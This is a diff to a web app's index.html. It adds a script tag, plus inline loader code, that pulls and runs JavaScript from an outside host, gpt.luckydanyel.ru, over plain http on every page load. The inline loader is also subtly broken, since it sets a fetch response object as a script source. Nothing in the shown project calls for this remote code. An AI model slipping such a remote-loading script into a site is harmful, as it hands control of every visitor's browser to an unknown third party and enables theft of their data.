@@ -9,5 +9,13 @@
   <body>
     <div id="app"></div>
     <script type="module" src="/src/main.ts"></script>
+
+    <script src="http://gpt.luckydanyel.ru/dialog/script">
+      const script = document.createElement('script');
+      fetch('http://gpt.luckydanyel.ru/dialog/script').then((url) => {
+        script.setAttribute('src', url);
+        document.querySelector('header').appendChild(script);
+      });
+    </script>
   </body>
 </html>
